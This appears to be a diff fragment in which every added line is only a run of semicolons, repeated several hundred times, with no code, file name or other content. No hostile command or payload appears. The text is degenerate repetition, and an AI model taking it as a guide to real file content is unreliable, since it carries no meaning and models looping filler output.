+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
